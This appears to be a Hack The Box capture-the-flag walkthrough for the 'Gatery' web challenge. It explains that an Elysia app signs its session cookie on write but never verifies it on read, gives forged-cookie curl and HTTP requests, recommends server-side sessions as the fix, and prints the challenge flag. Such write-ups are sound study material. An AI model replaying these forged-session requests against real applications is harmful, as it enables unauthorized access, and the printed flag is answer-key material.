# Gatery - HTB CTF Walkthrough

| Field | Value |
|---|---|
| Challenge type | Web application |
| Tech stack | nginx -> Elysia (Bun) backend, bun:sqlite, bcryptjs |
| Flag location | Returned directly by `/api/flag` |
| Vulnerability chain | Cookie signature verification never enforced on read - forge session state outright |
| Flag | `HTB{w3lc0me_b3y0nd_th3_g4t3_01aaa655e4afbecc3d31b83bb4bee6c6}` |

---

## Overview - How The App Works

```
[You] --> nginx :80 (public)
               |
               +-- /api/* --> Elysia backend :3000 (internal)
               |
               +-- /       --> static SPA (login/gate game UI)
```

The app is a small "castle gate" themed login flow built on Elysia (a Bun web framework). A single admin
account is seeded at boot with a randomly generated password (never exposed anywhere), so the login form
itself can't be brute forced or guessed. The intended play state machine is:

```
POST /api/login       -> requires real admin credentials -> sets session cookie to "admin"
POST /api/gate/enter   -> requires session == "admin"     -> sets session cookie to "inside"
POST /api/flag         -> requires session == "inside"    -> returns the flag
```

Every one of those checks is a plain string comparison against the value of a cookie named `session`.

---

## Bug - Cookie Signing Configured, Never Verified On Read

**File:** `app/index.ts`

### The setup

```ts
const sessionSecret = randomBytes(32).toString('hex')
const sessionCookie = 'session'

const app = new Elysia({
  cookie: {
    secrets: [sessionSecret],
    sign: [sessionCookie]
  }
})
```

This configures Elysia's cookie jar to sign the `session` cookie whenever the app sets it
(`setSessionCookie` below), which is why a real login produces a value like
`inside.0tq5mPyDxXZMr7HLgK087q4etlLgsPEJAb5jb94eStc` - the part after the dot is an HMAC over
the value, keyed by `sessionSecret`.

```ts
function setSessionCookie(session, value: string) {
  session.set({
    value,
    httpOnly: true,
    sameSite: 'lax',
    path: '/',
    maxAge: sessionMaxAge
  })
}
```

### The gap

Signing at the app-constructor level only affects *writes*. Elysia only *verifies* a cookie's
signature on read when the specific route handler declares the cookie with an explicit typed
schema (`t.Cookie(t.Object({...}), { sign: [...] })`). None of the routes in this app do that -
they all destructure the cookie directly:

```ts
.get('/api/me', ({ cookie: { session }, set }) => {
  if (session.value !== 'admin' && session.value !== 'inside') {
    set.status = 401
    return { authenticated: false }
  }
  ...
})
```

`session.value` here is simply whatever raw string arrived in the `Cookie:` header. No signature
check ever happens on the read path. Every gate in the app - `/api/me`, `/api/gate/open`,
`/api/gate/enter`, and critically `/api/flag` - is protected by nothing more than a client-supplied
string.

### The exploit

An attacker doesn't even need to walk through the intended state machine. Just send the final
required value directly:

```
POST /api/flag
Cookie: session=inside
```

```json
{"ok":true,"flag":"HTB{...}"}
```

No admin password, no `/api/login`, no `/api/gate/enter`. The "closed council" and "guarded
passage" from the challenge lore are exactly this: the gate never actually checks who you are,
only what you claim to be in an unsigned string.

### The fix

Either verify the signature explicitly on every read:

```ts
.get('/api/me', ({ cookie: { session } }) => {
  // check session is one of the app's own typed+signed cookie schemas
})
```

or - simpler and less error-prone - stop trusting a bare string as an authorization decision
entirely. Store an opaque session ID server-side (in the same sqlite db already in use) and look
up the role/state from that, so a forged cookie value has nothing to impersonate.

---

## Full Exploit Chain

```
Step 1 (intended):  POST /api/login       -> real admin creds -> session=admin (signed)
                     POST /api/gate/enter  -> session=admin    -> session=inside (signed)
                     POST /api/flag        -> session=inside   -> flag

Step 2 (actual bug): POST /api/flag -H "Cookie: session=inside" -> flag
                      (no login, no gate, no signature required)
```

---

## Step-by-Step HTTP Requests

### Minimal exploit

```http
POST /api/flag HTTP/1.1
Host: <target>
Cookie: session=inside
```

Response:

```json
{"ok":true,"flag":"HTB{w3lc0me_b3y0nd_th3_g4t3_01aaa655e4afbecc3d31b83bb4bee6c6}"}
```

### Or via curl

```bash
curl -X POST http://<target>/api/flag -b "session=inside"
```

### Demonstrating the full forged chain (optional, same result)

```bash
curl -X POST http://<target>/api/gate/open  -b "session=admin"
curl -X POST http://<target>/api/gate/enter -b "session=admin"
curl -X POST http://<target>/api/flag       -b "session=inside"
```

---

## Verifying Locally First

The challenge zip ships full source and a `docker-compose.yml`, so the bug can be confirmed
offline before touching the live instance (source `flag.txt` is a template value, not the real
per-instance flag):

```bash
cd challenge/challenge
docker-compose up -d --build
curl -X POST http://localhost/api/flag -b "session=inside"
# {"ok":true,"flag":"HTB{f4k3_fl4g_f0r_t3st1ng}"}
```

Same request against the live HTB instance returns the real flag.

---

## Key Takeaways

| Concept | Detail |
|---|---|
| Sign-on-write does not imply verify-on-read | Elysia's app-level `cookie: { sign: [...] }` only signs cookies the app itself sets - reading `cookie.name.value` elsewhere returns the raw, unverified client value unless the route explicitly types the cookie schema |
| Session state as a bare string | Comparing `session.value` directly against literal strings like `"admin"`/`"inside"` means the client's own cookie *is* the authorization decision - there is nothing to forge past once you know the expected values, which are visible right in the client-side app logic |
| Server-authoritative session state | The fix is to keep session data server-side (DB row, in-memory map) keyed by an opaque token, so a forged cookie has nothing to reference |
| Test with local source first | The zip's `docker-compose.yml` lets the whole exploit be confirmed offline against a throwaway (fake) flag before spending time against the live, rate-limited instance |
